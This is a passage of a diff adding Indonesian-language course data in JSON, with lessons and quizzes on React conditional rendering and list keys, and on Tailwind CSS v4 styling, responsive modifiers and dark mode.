AMAN 1: Gunakan perbandingan eksplisit > 0\n{daftarItem.length > 0 && <ItemListView items={daftarItem} />}\n\n// CARA AMAN 2: Gunakan double NOT (!!) untuk konversi ke boolean sejati\n{!!daftarItem.length && <ItemListView items={daftarItem} />}\n```\n\n## Kesalahan Umum Pemula\n- **Membiarkan angka 0 mengotori header**: Angka 0 muncul di pojok navbar karena penulisan `unreadCount && <Badge />` saat unreadCount bernilai 0. Gunakan `unreadCount > 0 && <Badge />`.\n\n## Praktik Mandiri\n1. Buat komponen `CartPreview` yang menerima props `items: string[]`.\n2. Terapkan `items.length > 0 ? (daftar item) : (teks 'Keranjang belanja Anda kosong')`.\n\n## Ringkasan\n- Gunakan **Early Return** di puncak fungsi untuk menangani status *Loading* dan *Error*.\n- Gunakan **Ternary Operator** untuk memilih antara dua komponen visual.\n- Gunakan **Logical AND (`&&`)** untuk menampilkan elemen tunggal secara kondisional.\n- Selalu gunakan **`array.length > 0`** (bukan `array.length &&`) untuk menghindari jebakan angka 0 yang tercetak di layar.",
+        "quizzes": [
+          {
+            "id": "q-12-5-1",
+            "question": "Perhatikan kode berikut:\nconst items = [];\nreturn <div>{items.length && <ProductList />}</div>;\nApa yang akan tampil secara visual di layar browser pengguna saat items adalah array kosong?",
+            "options": [
+              "Tercetak angka '0' di layar (karena 0 adalah nilai falsy numerik yang tetap dirender sebagai teks oleh React).",
+              "Tampil halaman kosong bersih tanpa teks.",
+              "Tampil pesan error merah.",
+              "Browser me-reload otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Dalam JSX, nilai 0 adalah number yang sah untuk dirender. Evaluasi 0 && <ProductList /> menghasilkan 0 yang tercetak nyata di layar."
+          },
+          {
+            "id": "q-12-5-2",
+            "question": "Bagaimana cara memperbaiki kode conditional rendering array di atas agar aman dan tidak mencetak angka 0 saat array kosong?",
+            "options": [
+              "{items.length > 0 && <ProductList />} atau {!!items.length && <ProductList />}",
+              "{items.length == 0 && <ProductList />}",
+              "{items.length ? <ProductList /> : null}",
+              "{items && <ProductList />}"
+            ],
+            "correctIndex": 0,
+            "explanation": "Memastikan ekspresi sebelah kiri operator && bertipe boolean murni (items.length > 0) mencegah angka 0 dirender ke DOM."
+          },
+          {
+            "id": "q-12-5-3",
+            "question": "Kapan pola 'Early Return' paling bersih dan efektif diterapkan di dalam sebuah komponen React?",
+            "options": [
+              "Di baris-baris awal komponen untuk langsung me-return tampilan skeleton loading spinner atau pesan error sebelum menjalankan logika render utama.",
+              "Hanya saat komponen tidak memiliki props.",
+              "Hanya di dalam tag <head> HTML.",
+              "Early return dilarang di React."
+            ],
+            "correctIndex": 0,
+            "explanation": "Early return menjaga struktur komponen tetap datar dan mudah dibaca dengan menangani status loading/error/empty di baris awal."
+          }
+        ]
+      },
+      {
+        "id": "lesson-12-6",
+        "stageId": "stage-12",
+        "slug": "rendering-lists-dan-kunci-unik-keys",
+        "title": "Rendering Lists & Mengapa Key Unik Sangat Krusial",
+        "titleEn": "Rendering Lists & The Key Prop",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mentransformasikan array menjadi daftar elemen JSX dengan .map(), peran prop `key` dalam algoritma Rekonsiliasi Virtual DOM, dan bahaya menggunakan array index sebagai key.",
+        "prerequisites": [
+          "conditional-rendering-ternary-logical-and"
+        ],
+        "learningObjectives": [
+          "Merender koleksi array data menjadi elemen JSX menggunakan Higher-Order Function `.map()`.",
+          "Menjelaskan fungsi prop `key` unik dalam membantu algoritma rekonsiliasi React melacak mutasi elemen.",
+          "Menganalisis bahaya bug fatal penggunaan Array Index (`key={index}`) saat item dihapus, disortir, atau disisipkan."
+        ],
+        "whyMatters": "Memahami prop `key` mencegah bug antarmuka paling aneh di React: input teks berpindah ke baris yang salah saat ada item yang dihapus.",
+        "careerContext": "Pertanyaan seputar 'Mengapa dilarang menggunakan array index sebagai key?' adalah pertanyaan standar dalam interview React.",
+        "commonMistakes": [
+          "Menggunakan `key={index}` pada daftar list yang elemennya dapat diurutkan (sort), dihapus, atau disisipkan di tengah.",
+          "Lupa me-return elemen JSX di dalam callback `.map()`."
+        ],
+        "keyTerms": [
+          {
+            "term": "List Rendering",
+            "definition": "Teknik mengubah koleksi array data menjadi elemen-elemen tampilan JSX secara dinamis."
+          },
+          {
+            "term": "key prop",
+            "definition": "Atribut string/number unik khusus yang digunakan React untuk mengidentifikasi item mana yang telah diubah, ditambah, atau dihapus."
+          },
+          {
+            "term": "Index as Key Anti-Pattern",
+            "definition": "Kebiasaan buruk menggunakan nomor indeks array sebagai key yang memicu bug state komponen anak saat susunan list berubah."
+          }
+        ],
+        "contentMd": "# Rendering Lists & Mengapa Key Unik Sangat Krusial\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara merender daftar item array dinamis menggunakan **`array.map()`**, memahami peran krusial prop spesial **`key`** dalam algoritma Virtual DOM, serta bahaya fatal menggunakan **Array Index (`key={index}`)**.\n\n## Mengapa Konsep Ini Penting?\nDaftar produk di toko online, linimasa cuitan media sosial, dan daftar materi di BelajarinAja semuanya berasal dari array data. Merender daftar dengan benar dan memberikan `key` yang stabil menjamin performa cepat dan mencegah bug interaksi.\n\n## 1. Merender List dengan `array.map()`\nDi React, perulangan array untuk menghasilkan tampilan UI selalu ditulis menggunakan method **`.map()`**:\n\n```tsx\ninterface Kursus {\n  id: string; // ID Unik dari Database\n  judul: string;\n  tingkat: \"Beginner\" | \"Intermediate\" | \"Advanced\";\n}\n\nexport function DaftarKursus({ listKursus }: { listKursus: Kursus[] }) {\n  return (\n    <ul className=\"space-y-2\">\n      {listKursus.map((kursus) => (\n        // WAJIB MEMBERIKAN PROP KEY UNIK PADA ELEMEN TERLUAR:\n        <li key={kursus.id} className=\"p-4 border rounded shadow-sm\">\n          <h3>{kursus.judul}</h3>\n          <span className=\"badge\">{kursus.tingkat}</span>\n        </li>\n      ))}\n    </ul>\n  );\n}\n```\n\n## 2. Mengapa React Membutuhkan Prop `key`?\nKetika susunan array berubah (misal ada item baru disisipkan di posisi teratas atau salah satu item dihapus):\n- Tanpa `key`: React tidak tahu item mana yang bergeser, sehingga React terpaksa **merender ulang seluruh elemen dari awal** (sangat boros performa).\n- Dengan `key` stabil (misal ID dari database): React langsung tahu: *\"Oh, item dengan id 'kursus-101' hanya berpindah posisi ke baris kedua\"*. React hanya memindahkan posisinya di DOM tanpa perlu menghancurkan elemen tersebut.\n\n## 3. Bahaya Fatal: Menggunakan Array Index (`key={index}`)\nBanyak pemula tergoda menulis `list.map((item, index) => <li key={index}>...</li>)`.\n\n```text\nDAFTAR AWAL:\nIndex 0: \"Materi HTML\" (key=\"0\") -> User mengetik catatan di input checkbox\nIndex 1: \"Materi CSS\"  (key=\"1\")\n\nJIKA ITEM PERTAMA DIHAPUS:\n\"Materi CSS\" sekarang bergeser menjadi Index 0 (key=\"0\")!\n💥 BUG: Input teks dan centang checkbox milik HTML tiba-tiba berpindah menempel ke CSS karena React mengira key=\"0\" adalah elemen yang sama!\n```\n\n> **Aturan Emas**: Selalu gunakan **ID persisten yang unik** dari data (seperti `item.id` dari database atau UUID), dan HANYA gunakan `index` jika list tersebut 100% statis (tidak akan pernah ditambah, dihapus, atau diurutkan).\n\n## Kesalahan Umum Pemula\n- **Memasang key di elemen anak bagian dalam**: Prop `key` **WAJIB** dipasang pada elemen paling luar yang langsung dikembalikan oleh callback `.map()`.\n\n## Praktik Mandiri\n1. Buat array data to-do list `[{ id: 't-1', text: 'Beli Kopi' }, { id: 't-2', text: 'Koding React' }]`.\n2. Render daftar tersebut dengan `.map()` dan sematkan `key={item.id}`.\n\n## Ringkasan\n- Gunakan **`array.map()`** untuk mentransformasikan data array menjadi komponen JSX.\n- Selalu berikan prop **`key`** unik dan stabil pada elemen terluar di dalam map.\n- Hindari penggunaan **Array Index (`key={index}`)** pada daftar dinamis untuk mencegah bug pertukaran state yang fatal.",
+        "quizzes": [
+          {
+            "id": "q-12-6-1",
+            "question": "Apa fungsi utama dari prop spesial key saat merender daftar elemen menggunakan array.map() di React?",
+            "options": [
+              "Memberikan identitas unik yang stabil pada setiap elemen agar algoritma Rekonsiliasi Virtual DOM React dapat melacak item mana yang ditambah, dihapus, atau diubah posisinya secara efisien.",
+              "Mengunci keyboard pengguna saat membaca daftar.",
+              "Mengurutkan array berdasarkan abjad otomatis.",
+              "Menghapus elemen duplikat di database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prop key membantu React mengidentifikasi entitas elemen secara persisten lintas siklus render untuk mengoptimalkan mutasi DOM."
+          },
+          {
+            "id": "q-12-6-2",
+            "question": "Mengapa menggunakan nomor indeks array (contoh: key={index}) sangat TIDAK disarankan pada daftar list yang dinamis (dapat ditambah/dihapus/diurutkan)?",
+            "options": [
+              "Karena saat urutan list berubah atau item dihapus, indeks array akan bergeser sehingga menyebabkan React salah mengaitkan local state (seperti input teks/checkbox) ke item yang salah.",
+              "Karena indeks array membuat file build menjadi 10 kali lebih besar.",
+              "Karena browser akan mematikan JavaScript.",
+              "Karena angka indeks dilarang oleh standar TypeScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "Index as key merusak identitas stabil elemen saat susunan urutan berubah, memicu bug fatal di mana state internal input menempel pada item yang keliru."
+          },
+          {
+            "id": "q-12-6-3",
+            "question": "Di manakah posisi yang benar untuk meletakkan atribut prop key unik saat merender list dengan .map()?",
+            "options": [
+              "Tepat pada elemen JSX paling luar yang langsung dikembalikan di dalam callback .map()",
+              "Pada elemen anak terdalam di dalam kartu",
+              "Pada tag <body> HTML",
+              "Di dalam file tsconfig.json"
+            ],
+            "correctIndex": 0,
+            "explanation": "React mewajibkan penempatan prop key pada elemen pembungkus terluar di dalam konteks iterasi map."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-13",
+    "orderIndex": 13,
+    "titleId": "Styling Modern: Tailwind CSS v4 & CSS Modules",
+    "titleEn": "Modern Styling: Tailwind CSS v4 & CSS Modules",
+    "category": "Frontend",
+    "description": "Menguasai arsitektur styling modern: Utility-First dengan Tailwind CSS v4 (@theme, CSS-first config), pseudo-classes, responsive prefixes, clsx & tailwind-merge (cn helper), dan CSS Modules.",
+    "descriptionEn": "Master modern styling: Tailwind CSS v4 (@theme, CSS-first), responsive prefixes, pseudo-classes, clsx, tailwind-merge, and CSS Modules.",
+    "lessons": [
+      {
+        "id": "lesson-13-1",
+        "stageId": "stage-13",
+        "slug": "filosofi-utility-first-dan-arsitektur-tailwind-v4",
+        "title": "Filosofi Utility-First & Arsitektur Tailwind CSS v4",
+        "titleEn": "Utility-First Philosophy & Tailwind CSS v4",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami mengapa Utility-First mendominasi industri, arsitektur baru Tailwind CSS v4 berbasis CSS-first (@import 'tailwindcss', @theme directive), dan kecepatan compiler Oxide.",
+        "prerequisites": [
+          "rendering-lists-dan-kunci-unik-keys"
+        ],
+        "learningObjectives": [
+          "Menjelaskan filosofi Utility-First CSS dibandingkan Semantic CSS tradisional.",
+          "Menjelaskan arsitektur baru Tailwind CSS v4 yang berbasis CSS-First (@import 'tailwindcss'; tanpa butuh tailwind.config.js rumit).",
+          "Mendefinisikan kustomisasi design tokens menggunakan direktif `@theme` di file CSS.",
+          "Menjelaskan kecepatan engine kompilasi baru (Oxide engine berbasis Rust)."
+        ],
+        "whyMatters": "Tailwind CSS adalah standar styling de facto dalam ekosistem React/Next.js modern yang mempercepat proses styling hingga 5x lipat.",
+        "careerContext": "Hampir seluruh lowongan frontend modern (serta library seperti Shadcn UI) mensyaratkan kemahiran Tailwind CSS.",
+        "commonMistakes": [
+          "Masih mencari-cari file `tailwind.config.js` di proyek Tailwind CSS v4 baru (v4 mengadopsi konfigurasi CSS-First murni via `@theme`).",
+          "Membuat nama class kustom sembarangan di file terpisah alih-alih menggunakan utility classes."
+        ],
+        "keyTerms": [
+          {
+            "term": "Utility-First",
+            "definition": "Pendekatan styling dengan menyusun kelas-kelas utilitas atomik kecil langsung pada markup elemen."
+          },
+          {
+            "term": "Tailwind CSS v4",
+            "definition": "Generasi baru Tailwind dengan arsitektur CSS-First, engine compiler berkecepatan tinggi, dan konfigurasi berbasis CSS murni."
+          },
+          {
+            "term": "@theme",
+            "definition": "Direktif baru di Tailwind v4 untuk mendeklarasikan custom color tokens, font, dan spacing langsung di stylesheet."
+          }
+        ],
+        "contentMd": "# Filosofi Utility-First & Arsitektur Tailwind CSS v4\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari revolusi **Utility-First CSS** dengan **Tailwind CSS v4**: mengapa developer tidak lagi menulis file CSS raksasa, arsitektur baru **CSS-First** (tanpa `tailwind.config.js` yang rumit), serta kustomisasi token menggunakan direktif **`@theme`**.\n\n## Mengapa Konsep Ini Penting?\nPada cara lama (CSS Semantik), Anda harus memikirkan nama kelas kustom (`.kartu-produk-header-wrapper-v2`), berpindah bolak-balik antara file `.tsx` dan `.css`, dan menghadapi file CSS yang membengkak hingga puluhan megabyte. Tailwind menyelesaikan seluruh masalah ini dengan menyediakan kelas utilitas atomik siap pakai.\n\n## 1. Filosofi Utility-First: Langsung di Tempat (*Co-location*)\n\n```tsx\n// DENGAN TAILWIND CSS:\n// Langsung menata gaya di markup tanpa perlu pusing memikirkan nama class!\n<button className=\"bg-blue-600 hover:bg-blue-700 text-white font-medium px-4 py-2 rounded-lg transition-colors shadow-md\">\n  Beli Kursus\n</button>\n```\n\n### Keunggulan Mutlak Utility-First:\n1. **Tidak Ada 'Naming Fatigue'**: Anda tidak perlu membuang waktu memikirkan nama class.\n2. **Ukuran CSS Produksi Sangat Kecil**: Compiler hanya menyertakan kelas yang benar-benar Anda gunakan (*tree-shaken*), menghasilkan file CSS produksi yang biasanya $< 15$ KB.\n3. **Aman dari Efek Samping Global**: Mengubah gaya satu tombol di komponen `Navbar` dijamin 100% tidak akan merusak tombol di komponen `Footer`.\n\n## 2. Arsitektur Baru Tailwind CSS v4 (CSS-First)\nDi Tailwind v4, Anda tidak lagi memerlukan file konfigurasi JavaScript `tailwind.config.js`. Semuanya dikonfigurasi langsung di dalam file `app/globals.css` atau `src/index.css` Anda menggunakan sintaks CSS modern standar:\n\n```css\n/* File: src/index.css */\n@import \"tailwindcss\";\n\n/* Kustomisasi Design Tokens langsung dengan @theme: */\n@theme {\n  --color-brand-primary: #2563eb;\n  --color-brand-accent: #f59e0b;\n  --font-display: \"Outfit\", sans-serif;\n  --radius-custom: 12px;\n}\n```\n\n## 3. Kompiler Super Cepat: Oxide Engine\nTailwind v4 ditenagai oleh engine compiler baru bernama **Oxide** yang ditulis dalam bahasa pemrograman Rust. Proses kompilasi dan reload halaman berlangsung hingga **10 kali lebih cepat** dibandingkan Tailwind generasi sebelumnya.\n\n## Kesalahan Umum Pemula\n- **Membuat file tailwind.config.js lama di proyek v4**: Di Tailwind v4, seluruh konfigurasi warna dan tema ditaruh di dalam direktif `@theme` pada file CSS Anda.\n\n## Praktik Mandiri\n1. Buat elemen kartu profil dengan Tailwind: latar putih, padding 6, sudut melengkung (`rounded-xl`), bayangan (`shadow-lg`), dan tombol interaktif dengan efek hover.\n\n## Ringkasan\n- **Utility-First** menata gaya secara cepat menggunakan kelas atomik langsung di markup JSX.\n- **Tailwind v4** mengusung arsitektur **CSS-First** (`@import \"tailwindcss\"` & `@theme`).\n- Ukuran CSS produksi sangat ringan dan aman dari konflik penamaan kelas global.",
+        "quizzes": [
+          {
+            "id": "q-13-1-1",
+            "question": "Apa filosofi utama dari pendekatan 'Utility-First CSS' yang diusung oleh Tailwind CSS?",
+            "options": [
+              "Membangun antarmuka secara cepat dengan menggabungkan kelas-kelas utilitas atomik kecil langsung di dalam markup elemen JSX tanpa perlu berpindah ke file CSS terpisah atau memikirkan penamaan class.",
+              "Mengharuskan penulisan seluruh kode CSS secara inline style pada atribut style={{}}.",
+              "Menghapus penggunaan warna pada antarmuka web.",
+              "Menggantikan fungsi komponen React dengan file HTML murni."
+            ],
+            "correctIndex": 0,
+            "explanation": "Utility-first mengutamakan komposisi kelas atomik di markup, mengeliminasi kerepotan penamaan class dan menjaga ukuran CSS produksi tetap sangat kecil."
+          },
+          {
+            "id": "q-13-1-2",
+            "question": "Bagaimana cara mendefinisikan kustomisasi warna dan design tokens pada arsitektur baru Tailwind CSS v4?",
+            "options": [
+              "Menggunakan direktif @theme langsung di dalam file stylesheet CSS utama (@import 'tailwindcss'; @theme { --color-brand: #...; })",
+              "Mengedit file kernel sistem operasi Windows.",
+              "Menuliskan konfigurasi di file XML terpisah.",
+              "Memasang extension browser Chrome."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tailwind CSS v4 mengadopsi arsitektur CSS-First di mana custom token dideklarasikan via direktif @theme di dalam file CSS utama."
+          },
+          {
+            "id": "q-13-1-3",
+            "question": "Mengapa ukuran berkas CSS produksi sebuah website yang dibangun dengan Tailwind CSS biasanya sangat kecil (< 15–20 KB) meskipun proyeknya sangat besar?",
+            "options": [
+              "Karena compiler Tailwind secara otomatis melakukan dead-code elimination (hanya meng-generate kelas utilitas yang benar-benar ditulis di dalam kode sumber proyek).",
+              "Karena Tailwind mengompresi gambar menjadi hitam putih.",
+              "Karena Tailwind menghapus teks artikel website.",
+              "Karena browser menolak mengunduh file CSS."
+            ],
+            "correctIndex": 0,
+            "explanation": "Compiler Tailwind memindai seluruh file template dan hanya mengekstrak utility classes yang benar-benar terpakai ke dalam file CSS final."
+          }
+        ]
+      },
+      {
+        "id": "lesson-13-2",
+        "stageId": "stage-13",
+        "slug": "layout-spacing-dan-typography-tailwind",
+        "title": "Layout, Spacing & Tipografi dengan Tailwind CSS",
+        "titleEn": "Tailwind Layout, Spacing & Typography",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menguasai kelas tata letak Flexbox (flex, justify-*, items-*), Grid (grid, grid-cols-*), Spacing scale (p-*, m-*, gap-*), dan Tipografi (text-*, font-*, leading-*).",
+        "prerequisites": [
+          "filosofi-utility-first-dan-arsitektur-tailwind-v4"
+        ],
+        "learningObjectives": [
+          "Menerapkan sistem skala spacing Tailwind (kelipatan 4: p-4 = 16px, p-2 = 8px, p-6 = 24px).",
+          "Membangun layout Flexbox dan Grid yang rapi menggunakan kelas utilitas Tailwind.",
+          "Mengatur tipografi profesional: ukuran font (text-sm, text-xl), ketebalan (font-medium, font-bold), dan jarak baris (leading-relaxed)."
+        ],
+        "whyMatters": "Skala angka standar Tailwind (0, 1, 2, 4, 6, 8, 12, 16) menjamin konsistensi ritme visual dan ruang spasial di seluruh halaman aplikasi.",
+        "careerContext": "Memahami sistem skala spacing Tailwind memungkinkan developer mengubah desain Figma menjadi kode akurat dalam hitungan detik.",
+        "commonMistakes": [
+          "Menggunakan nilai piksel acak sembarangan seperti `p-[13px]` alih-alih memanfaatkan skala standar `p-3` atau `p-4`.",
+          "Tertukar antara kelas `items-center` (vertikal pada flex-row) dan `justify-center` (horizontal)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Spacing Scale",
+            "definition": "Sistem skala kelipatan 4 standar Tailwind di mana 1 unit = 0.25rem (4px)."
+          },
+          {
+            "term": "grid-cols-*",
+            "definition": "Kelas utilitas untuk menentukan jumlah kolom pada CSS Grid (contoh: `grid-cols-3`)."
+          },
+          {
+            "term": "leading-*",
+            "definition": "Kelas utilitas untuk mengatur line-height (ketinggian baris teks)."
+          }
+        ],
+        "contentMd": "# Layout, Spacing & Tipografi dengan Tailwind CSS\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sistem inti Tailwind CSS: **Skala Spacing (Margin & Padding)**, pembentukan **Layout Flexbox & Grid**, serta penataan **Tipografi Profesional**.\n\n## Mengapa Konsep Ini Penting?\nDesain yang terlihat amatir biasanya memiliki jarak antar elemen yang tidak beraturan (misal ada padding 11px, 17px, 23px secara acak). Tailwind memberlakukan **Sistem Skala Spacing Harmonis** berbasis kelipatan **4px** yang menjamin keindahan visual aplikasi Anda.\n\n## 1. Sistem Skala Spacing (Kelipatan 4px / 0.25rem)\n\n| Nilai Class | Ukuran Piksel | Ukuran `rem` | Contoh Penggunaan |\n| :---: | :---: | :---: | :--- |\n| **`p-1`** | 4px | `0.25rem` | Jarak sangat rapat |\n| **`p-2`** | 8px | `0.5rem` | Padding badge / tag |\n| **`p-4`** | **16px** | **`1rem`** | Padding standar kartu (*Default*) |\n| **`p-6`** | 24px | `1.5rem` | Padding kartu besar |\n| **`p-8`** | 32px | `2rem` | Padding kontainer section |\n\n- **Prefix Arah**: `pt-4` (Padding Atas), `pb-4` (Bawah), `px-4` (Horizontal Kiri-Kanan), `py-4` (Vertikal Atas-Bawah).\n- **Margin**: `m-4`, `mx-auto` (Rata Tengah Horizontal Otomatis), `my-6`.\n\n## 2. Membangun Layout dengan Flexbox & Grid\n\n```tsx\n// POLA NAVBAR (FLEXBOX):\n<nav className=\"flex justify-between items-center px-6 py-4 bg-white border-b\">\n  <div className=\"font-bold text-xl text-blue-600\">BelajarinAja</div>\n  <div className=\"flex gap-4\">\n    <a href=\"#\" className=\"text-gray-600 hover:text-blue-600\">Kursus</a>\n    <a href=\"#\" className=\"text-gray-600 hover:text-blue-600\">Tentang</a>\n  </div>\n</nav>\n\n// POLA GALERI KARTU (CSS GRID 3 KOLOM):\n<div className=\"grid grid-cols-1 md:grid-cols-3 gap-6 p-6\">\n  <div className=\"bg-slate-50 p-6 rounded-xl border\">Kartu 1</div>\n  <div className=\"bg-slate-50 p-6 rounded-xl border\">Kartu 2</div>\n  <div className=\"bg-slate-50 p-6 rounded-xl border\">Kartu 3</div>\n</div>\n```\n\n## 3. Penataan Tipografi Profesional\n\n```tsx\n<article className=\"max-w-2xl mx-auto py-8\">\n  {/* Judul Besar: text-3xl font-extrabold tracking-tight */}\n  <h1 className=\"text-3xl font-extrabold text-neutral-900 dark:text-white tracking-tight mb-4\">\n    Menguasai Tailwind CSS v4\n  </h1>\n\n  {/* Paragraf Nyaman Dibaca: text-slate-600 leading-relaxed */}\n  <p className=\"text-slate-600 leading-relaxed text-base mb-6\">\n    Tailwind CSS memungkinkan kita membangun desain antarmuka modern secara sangat cepat tanpa perlu meninggalkan file JSX kita.\n  </p>\n</article>\n```\n\n## Kesalahan Umum Pemula\n- **Memakai nilai arbitrary `px` berlebihan**: Menulis `p-[15px]` merusak konsistensi design tokens. Gunakan skala resmi `p-4` (16px).\n\n## Praktik Mandiri\n1. Buat komponen kartu artikel: gambar di atas, judul `text-xl font-bold`, deskripsi `text-slate-600`, dan tombol aksi di kanan bawah menggunakan Flexbox.\n\n## Ringkasan\n- Skala spacing Tailwind berbasis kelipatan **4px** (`p-1` = 4px, `p-4` = 16px).\n- Gunakan **`flex justify-between items-center`** untuk perataan horizontal 1D.\n- Gunakan **`grid grid-cols-3 gap-6`** untuk susunan galeri 2D.\n- Gunakan **`leading-relaxed`** dan **`tracking-tight`** untuk tipografi yang elegan.",
+        "quizzes": [
+          {
+            "id": "q-13-2-1",
+            "question": "Berdasarkan sistem skala spacing standar Tailwind CSS, berapa ukuran piksel fisik yang dihasilkan oleh kelas utilitas p-4?",
+            "options": [
+              "16px (setara dengan 1rem)",
+              "4px",
+              "40px",
+              "24px"
+            ],
+            "correctIndex": 0,
+            "explanation": "Sistem skala Tailwind berbasis kelipatan 4px per unit (4 * 4 = 16px = 1rem)."
+          },
+          {
+            "id": "q-13-2-2",
+            "question": "Kombinasi kelas Tailwind manakah yang paling tepat untuk membuat susunan grid 3 kolom dengan jarak renggang 24px antar item?",
+            "options": [
+              "grid grid-cols-3 gap-6",
+              "flex flex-cols-3 margin-6",
+              "display-grid columns-3 space-6",
+              "grid-auto-3 padding-6"
+            ],
+            "correctIndex": 0,
+            "explanation": "grid mengaktifkan CSS Grid, grid-cols-3 membagi 3 kolom, dan gap-6 memberikan jarak renggang 24px (6 * 4px)."
+          },
+          {
+            "id": "q-13-2-3",
+            "question": "Kelas utilitas tipografi Tailwind manakah yang digunakan untuk mengatur jarak renggang antar baris teks (line-height) agar paragraf nyaman dibaca?",
+            "options": [
+              "leading-relaxed atau leading-normal",
+              "tracking-wide",
+              "font-bold",
+              "text-justify"
+            ],
+            "correctIndex": 0,
+            "explanation": "Prefix leading-* mengatur properti line-height (ketinggian baris teks) untuk kenyamanan membaca."
+          }
+        ]
+      },
+      {
+        "id": "lesson-13-3",
+        "stageId": "stage-13",
+        "slug": "pseudo-classes-responsive-modifiers-dan-dark-mode",
+        "title": "Pseudo-Classes, Responsive Modifiers & Dark Mode",
+        "titleEn": "Tailwind Modifiers: States, Responsive & Dark Mode",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menerapkan interaksi dengan pseudo-classes (hover:*, focus:*, active:*, disabled:*), modifier responsif mobile-first (sm:*, md:*, lg:*), dan dark mode dengan dark:* selector.",
+        "prerequisites": [
+          "layout-spacing-dan-typography-tailwind"
+        ],
+        "learningObjectives": [
+          "Menerapkan state modifier interaktif: hover, focus, active, disabled, dan group-hover.",
+          "Menerapkan pola Mobile-First menggunakan breakpoint prefixes: sm (640px), md (768px), lg (1024px).",
+          "Mengimplementasikan dukungan Dark Mode otomatis menggunakan prefix dark:*."
+        ],
+        "whyMatters": "Modifier prefixes di Tailwind memungkinkan pembuatan antarmuka interaktif yang responsif dan mendukung tema gelap tanpa menulis satu baris CSS manual pun.",
+        "careerContext": "Seluruh aplikasi SaaS modern wajib mendukung mode gelap (Dark Mode) dan tampilan adaptif mobile menggunakan modifier Tailwind.",
+        "commonMistakes": [
+          "Menulis prefix breakpoint terbalik (ingat bahwa Tailwind mengusung filosofi Mobile-First: `grid-cols-1 md:grid-cols-3`, bukan sebaliknya).",
+          "Lupa menambahkan kelas `focus:ring` untuk aksesibilitas navigasi keyboard."
+        ],
+        "keyTerms": [
+          {
+            "term": "State Modifiers",
+            "definition": "Prefix penanda kondisi interaksi seperti `hover:`, `focus:`, `disabled:`."
+          },
+          {
+            "term": "Responsive Modifiers",
+            "definition": "Prefix penanda breakpoint layar seperti `sm:`, `md:`, `lg:`, `xl:`."
+          },
+          {
+            "term": "dark:*",
+            "definition": "Modifier penanda bahwa gaya tersebut hanya aktif saat mode gelap (dark theme) sedang menyala."
+          }
+        ],
+        "contentMd": "# Pseudo-Classes, Responsive Modifiers & Dark Mode\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sistem **Modifiers** di Tailwind CSS: menanggapi status interaksi (**`hover:`**, **`focus:`**, **`disabled:`**), mengatur tampilan adaptif **Mobile-First** (**`sm:`**, **`md:`**, **`lg:`**), serta mengaktifkan **Dark Mode (`dark:`)**.\n\n## Mengapa Konsep Ini Penting?\nDi CSS biasa, membuat tombol yang berubah warna saat di-hover, memiliki outline saat ditekan tombol Tab keyboard, melebar di layar HP, dan berubah menjadi hitam saat mode malam membutuhkan puluhan baris media query dan selektor bersarang. Di Tailwind, semua itu diselesaikan dengan menambahkan *prefix* langsung pada kelas.\n\n## 1. State Modifiers (Interaksi Pengguna)\n\n```tsx\n<button className=\"\n  bg-blue-600 text-white font-medium px-4 py-2 rounded-lg\n  hover:bg-blue-700          /* Saat kursor diarahkan */\n  active:scale-95            /* Saat tombol ditekan klik */\n  focus:ring-2 focus:ring-blue-400 focus:outline-none /* Aksesibilitas Keyboard */\n  disabled:opacity-50 disabled:cursor-not-allowed    /* Saat tombol terkunci */\n  transition-all\n\">\n  Simpan Perubahan\n</button>\n```\n\n## 2. Responsive Modifiers (Filosofi Mobile-First)\nIngat aturan emas: **Gaya dasar tanpa prefix adalah untuk Layar Smartphone terkecil**. Gunakan `md:` atau `lg:` hanya saat ingin mengubah tata letak di tablet atau komputer desktop:\n\n```tsx\n{/* Di HP: 1 Kolom vertikal. Di Tablet/Laptop (md = 768px ke atas): 3 Kolom horizontal! */}\n<div className=\"grid grid-cols-1 md:grid-cols-3 gap-4\">\n  <div className=\"p-4 bg-white\">Kolom 1</div>\n  <div className=\"p-4 bg-white\">Kolom 2</div>\n  <div className=\"p-4 bg-white\">Kolom 3</div>\n</div>\n```\n\n## 3. Implementasi Dark Mode Instan dengan `dark:*`\nCukup tambahkan prefix **`dark:`** untuk menentukan warna saat tema gelap aktif:\n\n```tsx\n<div className=\"bg-white dark:bg-neutral-900 text-neutral-900 dark:text-white p-6 rounded-xl border border-neutral-200 dark:border-neutral-800\">\n  <h3 className=\"font-bold text-lg\">Kartu Dark Mode Otomatis</h3>\n  <p className=\"text-neutral-600 dark:text-neutral-400\">\n    Teks ini otomatis terang saat mode gelap aktif!\n  </p>\n</div>\n```\n\n## Kesalahan Umum Pemula\n- **Menulis prefix terbalik**: Menulis `w-full sm:w-full` karena mengira `sm:` adalah untuk HP. `sm:` berlaku untuk layar $ge 640$px. Gaya dasar tanpa prefix adalah untuk layar HP.\n\n## Praktik Mandiri\n1. Buat kartu profil dengan background `bg-white dark:bg-zinc-900`.\n2. Tambahkan tombol interaktif yang memiliki transisi `hover:bg-blue-600 active:scale-95`.\n\n## Ringkasan\n- Gunakan **`hover:`**, **`focus:`**, dan **`disabled:`** untuk interaksi dinamis.\n- Terapkan alur **Mobile-First**: tulis gaya dasar untuk HP, lalu tambahkan **`md:`** atau **`lg:`** untuk layar lebar.\n- Gunakan prefix **`dark:`** untuk mewarnai elemen saat Dark Mode menyala.",
+        "quizzes": [
+          {
+            "id": "q-13-3-1",
+            "question": "Berdasarkan filosofi Mobile-First di Tailwind CSS, kelas grid-cols-1 md:grid-cols-3 memiliki arti apa?",
+            "options": [
+              "Tampilan default pada layar ponsel terkecil adalah 1 kolom, dan otomatis berubah menjadi 3 kolom saat lebar layar mencapai breakpoint medium (768px ke atas).",
